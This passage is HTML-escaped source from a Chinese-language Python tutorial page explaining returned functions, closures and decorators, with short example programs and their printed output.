style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;])) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#可以转换成list来查看结果&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(a)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;返回函数&lt;&#x2F;p&gt;
&lt;p&gt;函数作为结果被输出&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;sum&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;x&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;y&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;sum1&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;x+y &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#里层函数调用外层函数的参数，属于闭包&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;sum1  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#sum1是里层函数，在这里被当做结果输出，所以这是一个返回函数&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;a=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;sum&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#创建变量a，赋值为函数sum()，传入参数1，2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;closure&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    i=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;clo2&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;i*i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#底层调用外层函数的变量，也属于闭包&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;clo2&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;a=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;closure&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;闭包&lt;&#x2F;p&gt;
&lt;p&gt;如果在一个内部函数里，对在外部作用域（但不在全局作用域）的变量进行引用，那么内部函数就被认为闭包（closure） &lt;&#x2F;p&gt;
&lt;p&gt;装饰器（闭包是调用变量，装饰器调用函数）&lt;&#x2F;p&gt;
&lt;p&gt;decorator采用函数作为参数，然后对此函数进行装饰，增强其功能。装饰器可以为函数增加功能，但是无需修改原有函数内部结构&lt;&#x2F;p&gt;
&lt;p&gt;装饰器是闭包的高阶应用&lt;&#x2F;p&gt;
&lt;p&gt;闭包是内部函数调用外部函数的变量，装饰器是调用函数&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;定义装饰器&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;deco&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;func&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​	&lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;def&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;wrapper&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​		函数体包括func&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;wrapper&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;定义函数&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;func&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	函数体&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;装饰函数&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;@&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;deco&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;func&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​	函数体&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;例子1：不带参数的装饰器&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;deco&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;func&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;wrapper&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;this is a decorator&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;func&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;wrapper&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;@&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;deco&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;this is a function&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;例子2：带参数的装饰器&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;deco&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;func&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;wrapper&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;n&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;this is a decorator&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,n)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;func&lt;&#x2F;span&gt;&lt;span&gt;(n)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;wrapper&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;@&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;deco&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;n&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;this is a function&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;test&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;strong&gt;注意：：：&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;this is a function&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;555&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span&gt;()) &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 输出：&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# this is a function&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 555&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;deco&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;func&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;wrapper&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;this is a decorator&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;func&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(wrapper)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;wrapper&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;@&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;deco&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;this is a function&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 输出：&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# &amp;lt;function deco.&amp;lt;locals&amp;gt;.wrapper at 0x04C02268&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# this is a decorator&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# this is a function&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;deco&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;func&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;wrapper&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;this is a decorator&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;func&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;wrapper&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;wrapper&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;@&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;deco&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;this is a function&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 输出：&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# this is a decorator  第5行输出&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# this is a function   第5行输出&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# None                 第5行输出&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# this is a decorator  第4行输出（由于第6行的存在）&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# this is a function   第4行输出（由于第6行的存在）&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;this is a function&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;wrapper&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;this is a decorator&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
